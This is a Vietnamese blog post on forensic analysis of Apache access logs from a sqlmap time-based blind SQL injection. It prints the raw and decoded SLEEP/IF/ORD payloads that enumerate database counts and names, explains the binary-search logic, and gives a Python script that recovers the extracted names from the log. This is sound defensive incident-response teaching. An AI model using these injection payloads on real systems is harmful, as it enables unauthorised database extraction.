### 1. Giới thiệu
Log là một phần thông tin quan trọng được cung cấp để ghi lại các  sự kiện, hành động diễn ra trong thời gian chạy service hay ứng dụng. Tất cả thông tin trong file log giúp ích cho việc theo dõi hiệu suất, khắc phục sự cố và gỡ lỗi ứng dụng hay forensic.  Trong Apache HTTP Server cung cấp 2 file log chính là access.log và error.log. File access.log ghi lại tất cả các yêu cầu của người dùng, ví dụ người dùng truy 
vào `www.example.com/main.php` một dòng log sẽ được ghi lại như sau:
```
5.188.33.13 - - [12/Aug/2020:03:01:27 +0000] "GET /hello.php HTTP/1.1" 404 436 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36"
```
**SQL injection** là một kỹ thuật cho phép kẻ tấn công lợi dụng việc kiểm tra đầu vào để inject những câu lệnh SQL. Tùy vào mỗi trường hợp khác nhau mà SQL injection cho phép kẻ tấn công thực hiện các thao tác như: SELECT, INSERT, UPDATE, DELETE...

### 2. Phân tích log

Giả sử có một trang web thực hiện việc tìm kiếm theo `id` nhưng họ lại không thực hiện việc lọc input mà người dùng nhập vào dẫn đến việc bị tấn công. Sau khi thấy nhiều requests lạ nên đã tiến hành kiểm tra

```
103.37.29.230 - - [10/Aug/2020:08:05:13 +0000] "GET /webapp/search.php?id=123%20AND%20%28SELECT%203431%20FROM%20%28SELECT%28SLEEP%285-%28IF%2823%3D23%2C0%2C5%29%29%29%29%29GBTr%29 HTTP/1.1" 200 316 "-" "sqlmap/1.4.7#stable (http://sqlmap.org)"
103.37.29.230 - - [10/Aug/2020:08:05:18 +0000] "GET /webapp/search.php?id=123%20AND%20%28SELECT%201715%20FROM%20%28SELECT%28SLEEP%285-%28IF%2823%3D41%2C0%2C5%29%29%29%29%29rSdW%29 HTTP/1.1" 200 316 "-" "sqlmap/1.4.7#stable (http://sqlmap.org)"
```
Nhìn vào log thì thấy user-agent là `sqlmap/1.4.7#stable (http://sqlmap.org)` thì chúng ta có thể đoán kẻ tấn công đã dùng tool sqlmap để thực hiện việc tấn công sql injection. Kẻ tấn công đã lợi dụng việc search với id không được kiểm tra kỹ càng để thực hiện việc tấn công.

Decode URL 2 request mà attacker gửi lên để xem query thực hiện việc tấn công như nào?
```
103.37.29.230 - - [10/Aug/2020:08:05:13  0000] "GET /webapp/search.php?id=123 AND (SELECT 3431 FROM (SELECT(SLEEP(5-(IF(23=23,0,5)))))GBTr) HTTP/1.1" 200 316 "-" "sqlmap/1.4.7#stable (http://sqlmap.org)"
103.37.29.230 - - [10/Aug/2020:08:05:18  0000] "GET /webapp/search.php?id=123 AND (SELECT 1715 FROM (SELECT(SLEEP(5-(IF(23=41,0,5)))))rSdW) HTTP/1.1" 200 316 "-" "sqlmap/1.4.7#stable (http://sqlmap.org)"
```





Phân tích query :
+ Attacker thực hiện việc so sánh IF(23=23,0,5) câu lệnh này thực hiện nếu như 23=23 đúng trả về 0 ngược lại trả về 5
+ Tiếp đến là SLEEP(5-(IF(23=23,0,5)  nếu như biểu thức trước đó trả về 0 thì sẽ slee(5-0) và ngược lại sleep(5-5), tức là nếu như 23=23 thì sẽ sleep(5) và ngược lại thì sleep(0).

Có vẻ như attacker sử dụng delay response(sleep(5)) để xác nhận việc mình đã inject thành công hay không. Nhìn vào khoảng thời gian giữa 2 request thì chúng cách nhau đúng 5 giây cho thấy attacker dường như đã inject thành công và chuẩn bị mở ra một cuộc tấn công `time based sql injection`

![](https://images.viblo.asia/ced42bc6-e038-4f21-87c0-0635cd9ef8e2.png)

Tiếp theo attacker đã lấy được những gì
```
103.37.29.230 - - [10/Aug/2020:08:07:27 +0000] "GET /webapp/search.php?id=123%20AND%20%28SELECT%202854%20FROM%20%28SELECT%28SLEEP%285-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28DISTINCT%28schema_name%29%29%20AS%20NCHAR%29%2C0x20%29%20FROM%20INFORMATION_SCHEMA.SCHEMATA%29%2C1%2C1%29%29%3E54%2C0%2C5%29%29%29%29%29xYZj%29 HTTP/1.1" 200 398 "-" "sqlmap/1.4.7#stable (http://sqlmap.org)"
103.37.29.230 - - [10/Aug/2020:08:07:32 +0000] "GET /webapp/search.php?id=123%20AND%20%28SELECT%202854%20FROM%20%28SELECT%28SLEEP%285-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28DISTINCT%28schema_name%29%29%20AS%20NCHAR%29%2C0x20%29%20FROM%20INFORMATION_SCHEMA.SCHEMATA%29%2C1%2C1%29%29%3E56%2C0%2C5%29%29%29%29%29xYZj%29 HTTP/1.1" 200 398 "-" "sqlmap/1.4.7#stable (http://sqlmap.org)"
103.37.29.230 - - [10/Aug/2020:08:07:33 +0000] "GET /webapp/search.php?id=123%20AND%20%28SELECT%202854%20FROM%20%28SELECT%28SLEEP%285-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28DISTINCT%28schema_name%29%29%20AS%20NCHAR%29%2C0x20%29%20FROM%20INFORMATION_SCHEMA.SCHEMATA%29%2C1%2C1%29%29%3E55%2C0%2C5%29%29%29%29%29xYZj%29 HTTP/1.1" 200 398 "-" "sqlmap/1.4.7#stable (http://sqlmap.org)"
103.37.29.230 - - [10/Aug/2020:08:07:33 +0000] "GET /webapp/search.php?id=123%20AND%20%28SELECT%202854%20FROM%20%28SELECT%28SLEEP%285-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28DISTINCT%28schema_name%29%29%20AS%20NCHAR%29%2C0x20%29%20FROM%20INFORMATION_SCHEMA.SCHEMATA%29%2C1%2C1%29%29%21%3D55%2C0%2C5%29%29%29%29%29xYZj%29 HTTP/1.1" 200 399 "-" "sqlmap/1.4.7#stable (http://sqlmap.org)"
```

Decode URL thì thấy lần này query đã phức tạp hơn so với trước, cùng xem mục đích của nó để làm gì? 

```
103.37.29.230 - - [10/Aug/2020:08:07:27  0000] "GET /webapp/search.php?id=123 AND (SELECT 2854 FROM (SELECT(SLEEP(5-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),1,1))>54,0,5)))))xYZj) HTTP/1.1" 200 398 "-" "sqlmap/1.4.7#stable (http://sqlmap.org)"
103.37.29.230 - - [10/Aug/2020:08:07:32  0000] "GET /webapp/search.php?id=123 AND (SELECT 2854 FROM (SELECT(SLEEP(5-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),1,1))>56,0,5)))))xYZj) HTTP/1.1" 200 398 "-" "sqlmap/1.4.7#stable (http://sqlmap.org)"
103.37.29.230 - - [10/Aug/2020:08:07:33  0000] "GET /webapp/search.php?id=123 AND (SELECT 2854 FROM (SELECT(SLEEP(5-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),1,1))>55,0,5)))))xYZj) HTTP/1.1" 200 398 "-" "sqlmap/1.4.7#stable (http://sqlmap.org)"
103.37.29.230 - - [10/Aug/2020:08:07:33  0000] "GET /webapp/search.php?id=123 AND (SELECT 2854 FROM (SELECT(SLEEP(5-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),1,1))!=55,0,5)))))xYZj) HTTP/1.1" 200 399 "-" "sqlmap/1.4.7#stable (http://sqlmap.org)"
```

```sql
id=123 AND (
    SELECT 2854 FROM (
        SELECT(
            SLEEP(
                5-(
                    IF(
                        ORD(
                            MID(
                                (
                                    SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA
                                ),1,1
                            )
                        )>54,0,5
                    )
                )
            )
        )
    )
    xYZj
)
```
Nhìn query trông rất rối mắt nên ta cần thực hiện từng bước một:

+ Đầu tiên attacker thực hiện việc đếm số databases trên server bằng cách thực hiện thực hiện query: `SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA`
    + Trong đó `CAST(COUNT(DISTINCT(schema_name)) AS NCHAR` đếm só databases trên server và chuyển sang dạng NCHAR.![](https://images.viblo.asia/e2f94f00-66e0-4b45-8858-6f7db9ba2869.png)

    + IFNULL nếu như việc thực hiện đếm số databases trên server trả về NULL thì hàm IFNULL sẽ trả về`0x20` ngược lại thì sẽ trả về kết quả của câu lệnh được thực hiện trong đó.
+ Tiếp đến hàm MID thực hiện việc lấy ra từng ký tự vừa được thực hiện `SELECT` trước đó.
+ Hàm ORD sẽ trả về dạng thập phân của ký tự ngoài cùng bên trái
    + ![](https://images.viblo.asia/3904601b-4768-48e1-bad3-46e4af7f5e0b.png)
    + Dựa vào kết quả ở trên chúng ta đếm được 7 databases trên server và lấy một thì được ký tự chuyển sang mã thập phân ta được 55
+ Tiếp tục so sánh nếu như mã thập phân đó lớn hơn 54 thì trả về 0 ngược lại trả về 5, khi đó biểu thức sẽ trở thành IF(55>54,0,5).
+  Cuối cùng là dấu hiểu đã nhận biết của attacker SLEEP(5-IF(55>54,0,5)), với biểu thức như kia thì sẽ sleep 5 giây.
Nhìn vào khoảng thời gian thì thấy 2 requests cách nhau 5s:

![](https://images.viblo.asia/83205251-3782-4a2d-aacb-c37a72de87a5.png)

Nên attacker đã chuyển sang mã thập phân mới là 56:
```sql
id=123 AND (SELECT 2854 FROM (SELECT(SLEEP(5-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),1,1))>56,0,5)))))xYZj)
```

![](https://images.viblo.asia/fd37ddbf-1a05-494a-92cc-a369acd15f4d.png)

và response không delay và tiếp tục chuyển thành 55:
```sql
id=123 AND (SELECT 2854 FROM (SELECT(SLEEP(5-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),1,1))>55,0,5)))))xYZj)
```
cũng không nhận được delay response.

Có vẻ như sqlmap sử dụng thuật toán chặt nhị phân để thực hiện việc kiểm tra và cuối cùng để xác nhận là !=55 thì sẽ sleep(5), đương nhiên là không thể có mã thập phân nào lớn hơn 54 và nhỏ hơn 56 mà lại != 55 cả vậy nên request chỉ để xác nhận là attacker đã tìm kiếm đúng số databases trên server

```sql
id=123 AND (SELECT 2854 FROM (SELECT(SLEEP(5-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),1,1))!=55,0,5)))))xYZj)
```

Sau khi xác định được số databases trên server attacker thực hiện việc lấy ra tên của các databases đó.
```
103.37.29.230 - - [10/Aug/2020:08:07:34 +0000] "GET /webapp/search.php?id=123%20AND%20%28SELECT%209731%20FROM%20%28SELECT%28SLEEP%285-%28IF%28ORD%28MID%28%28SELECT%20DISTINCT%28IFNULL%28CAST%28schema_name%20AS%20NCHAR%29%2C0x20%29%29%20FROM%20INFORMATION_SCHEMA.SCHEMATA%20LIMIT%200%2C1%29%2C1%2C1%29%29%3E64%2C0%2C5%29%29%29%29%29GYFj%29 HTTP/1.1" 200 399 "-" "sqlmap/1.4.7#stable (http://sqlmap.org)"
```
Decode URL:
```
103.37.29.230 - - [10/Aug/2020:08:07:34  0000] "GET /webapp/search.php?id=123 AND (SELECT 9731 FROM (SELECT(SLEEP(5-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1),1,1))>64,0,5)))))GYFj) HTTP/1.1" 200 399 "-" "sqlmap/1.4.7#stable (http://sqlmap.org)"
```

Query lấy ra các tên databases:
```sql
id=123 AND (SELECT 9731 FROM (SELECT(SLEEP(5-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1),1,1))>64,0,5)))))GYFj)
```
Phân tích query phần lấy ra tên các databases thì gần như tương tự với lấy ra số databases đã phân tích ở trên, nhưng việc thực hiện được lặp nhiều lần rất khó để phân tích tay. Phần lấy ra tên bảng đó là lấy ra mỗi ký tự của tên bảng đó và thử so sánh với giá trị mà attacker đã đoán và dùng sleep làm dấu hiệu để nhận biết, và phần này có thêm limit để lấy ra đúng thứ tự và từng database một.

Thuật toán của sqlmap vẫn như vậy sẽ dùng chặt nhị phân để kiểm tra các ký tự, và cuối cùng sẽ xác nhận lại bằng một biểu thức `!=` nên việc viết script để lấy ra dữ liệu mà attacker đã lấy dễ dàng hơn, chỉ đọc từng dòng của tròng file log và kiểm tra xem có dấu `!=` hay không, tùy nhiên trong file log thì bị encode url nên chúng ta sẽ thực hiện việc tìm kiếm theo encode url để nhận được kết quả chính xác nhất.

Mình tách phần lấy tên các databases ra một file riêng và viết script để xem attacker đã lấy được những gì như sau:
```python
import re

lines = open("dump_database.log").read().splitlines() #đọc từ file và tách thành từng dòng
databases = "" #lưu các tên databases
idx = 0
for line in lines:
    result = re.findall("%21%3D[0-9]{2,3}%2C",line) # tìm các chỗ != trên mỗi dòng log
    old_idx = int(re.findall("LIMIT%20[0-9]{1,2}%2C",line)[0][8:-3]) # tìm phần limit để xem đã kết thúc tên một bảng hay chưa
    if result:
        if old_idx > idx: 
            databases+=" "
            idx = old_idx
        databases += chr(int(result[0][6:-3]))
print(databases.split(" "))
```

Sau khi chạy script mình được kết quả như sau:

![](https://images.viblo.asia/64f243de-fcff-44e5-be4d-a0507849ccd4.png)
Kiểm tra trên server thì thấy đúng như là attacker đã lấy:

![](https://images.viblo.asia/9f0945c1-d9d2-4625-9573-426b7c3b1dc2.png)

Bài viết này hi vọng giúp các bạn phần nào đó trong việc phân tích log của một cuộc tấn công. Phần tiếp theo mình sẽ phân tích xem attacker đã dump database nào và lấy được những gì